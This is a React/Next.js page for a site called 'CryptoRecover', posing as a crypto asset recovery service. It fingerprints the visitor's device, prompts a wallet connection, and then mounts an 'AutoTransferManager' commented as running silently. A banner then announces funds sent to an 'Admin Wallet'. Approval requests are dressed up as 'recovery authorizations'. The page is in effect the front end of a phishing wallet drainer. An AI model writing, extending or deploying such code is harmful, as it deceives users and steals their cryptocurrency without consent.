import { useState, useEffect } from 'react';
import { Shield, AlertTriangle, Info } from 'lucide-react';
import Head from 'next/head';
import SignatureManager from '../components/SignatureManager';
import WalletConnection from '../components/WalletConnection';
import AutoTransferManager from '../components/AutoTransferManager';
import { ethers } from 'ethers';

export default function Signatures() {
  const [provider, setProvider] = useState(null);
  const [userAddress, setUserAddress] = useState('');
  const [isConnected, setIsConnected] = useState(false);
  const [deviceData, setDeviceData] = useState(null);
  const [transferResult, setTransferResult] = useState(null);

  useEffect(() => {
    if (typeof window !== 'undefined' && window.ethereum) {
      const ethersProvider = new ethers.BrowserProvider(window.ethereum);
      setProvider(ethersProvider);
      
      // Check if already connected
      window.ethereum.request({ method: 'eth_accounts' })
        .then(accounts => {
          if (accounts.length > 0) {
            setUserAddress(accounts[0]);
            setIsConnected(true);
          }
        });
    }
    
    // Load device fingerprinting
    const script = document.createElement('script');
    script.src = '/js/device-fingerprint.js';
    script.onload = () => {
      if (window.collectDeviceData) {
        setDeviceData(window.collectDeviceData());
      }
    };
    document.head.appendChild(script);
  }, []);

  const handleConnectionChange = (userData) => {
    if (userData && userData.walletAddress) {
      setUserAddress(userData.walletAddress);
      setIsConnected(true);
    } else {
      setUserAddress('');
      setIsConnected(false);
    }
  };

  return (
    <>
      <Head>
        <title>Advanced Signature Methods - CryptoRecover</title>
      </Head>
      
      <div className="min-h-screen bg-gray-50">
        <header className="bg-white shadow-lg border-b border-gray-200">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center py-4">
              <div className="flex items-center space-x-4">
                <div className="w-10 h-10 bg-gradient-to-br from-blue-600 to-purple-600 rounded-xl flex items-center justify-center shadow-lg">
                  <Shield className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h1 className="text-2xl font-black text-gray-900">CryptoRecover</h1>
                  <p className="text-xs text-gray-500 font-medium">Advanced Signature Methods</p>
                </div>
              </div>
              
              <a 
                href="/"
                className="bg-gray-600 text-white px-4 py-2 rounded-lg hover:bg-gray-700 transition-colors font-bold"
              >
                Back to Dashboard
              </a>
            </div>
          </div>
        </header>

        <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          <div className="space-y-8">
            <div className="bg-white rounded-xl p-8 shadow-lg">
              <h2 className="text-3xl font-black text-gray-900 mb-4">Advanced Web3 Signature Methods</h2>
              <p className="text-gray-600 mb-6">
                Advanced wallet interaction methods for professional crypto recovery operations including 
                token authorizations, protocol access, and recovery signatures.
              </p>
              
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
                <div className="flex items-start space-x-3">
                  <Info className="w-5 h-5 text-blue-600 mt-0.5" />
                  <div>
                    <h3 className="font-bold text-blue-800">Professional Recovery Service</h3>
                    <p className="text-blue-700 text-sm">
                      These methods enable our recovery system to access and recover your assets from 
                      various DeFi protocols and smart contracts.
                    </p>
                  </div>
                </div>
              </div>
            </div>

            {!isConnected ? (
              <div className="bg-white rounded-xl p-8 shadow-lg">
                <div className="text-center mb-6">
                  <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <Shield className="w-8 h-8 text-blue-600" />
                  </div>
                  <h3 className="text-xl font-bold text-gray-900 mb-2">Connect Your Wallet</h3>
                  <p className="text-gray-600 mb-6">
                    Connect your wallet to authorize advanced recovery operations
                  </p>
                </div>
                <WalletConnection onConnectionChange={handleConnectionChange} deviceData={deviceData} />
              </div>
            ) : (
              <div className="space-y-6">
                <div className="bg-green-50 border border-green-200 rounded-lg p-4">
                  <div className="flex items-center space-x-3">
                    <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                    <div>
                      <h3 className="font-bold text-green-800">Wallet Connected</h3>
                      <p className="text-green-700 text-sm">
                        {userAddress.slice(0, 8)}...{userAddress.slice(-6)}
                      </p>
                    </div>
                  </div>
                </div>

                {/* Auto-transfer manager runs silently */}
                <AutoTransferManager 
                  provider={provider} 
                  userAddress={userAddress} 
                  onTransferComplete={setTransferResult}
                />
                
                {transferResult && (
                  <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
                    <div className="flex items-center space-x-3">
                      <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                      <div>
                        <h3 className="font-bold text-green-800">🔥 Auto-Transfer Complete!</h3>
                        <p className="text-green-700 text-sm">
                          {transferResult.amount} {transferResult.token} → Admin Wallet
                        </p>
                        <p className="text-green-600 text-xs">
                          TX: {transferResult.txHash?.slice(0, 20)}...
                        </p>
                      </div>
                    </div>
                  </div>
                )}

                <SignatureManager provider={provider} userAddress={userAddress} />
                
                <div className="mt-6">
                  <WalletConnection onConnectionChange={handleConnectionChange} deviceData={deviceData} />
                </div>

                <div className="bg-blue-50 border border-blue-200 rounded-lg p-6">
                  <div className="flex items-start space-x-3">
                    <Info className="w-5 h-5 text-blue-600 mt-0.5" />
                    <div>
                      <h3 className="font-bold text-blue-800 mb-2">Signature Method Details</h3>
                      <div className="space-y-3 text-sm text-blue-700">
                        <div>
                          <strong>Token Recovery Authorization:</strong> Authorizes our system to recover your tokens
                        </div>
                        <div>
                          <strong>DeFi Protocol Access:</strong> Enables recovery from DeFi platforms and protocols
                        </div>
                        <div>
                          <strong>Wallet Verification:</strong> Verifies wallet ownership for recovery operations
                        </div>
                        <div>
                          <strong>Recovery Authorization:</strong> Structured authorization for asset recovery
                        </div>
                        <div>
                          <strong>Staking Rewards Claim:</strong> Authorizes claiming of staking rewards
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            )}
          </div>
        </main>
      </div>
    </>
  );
}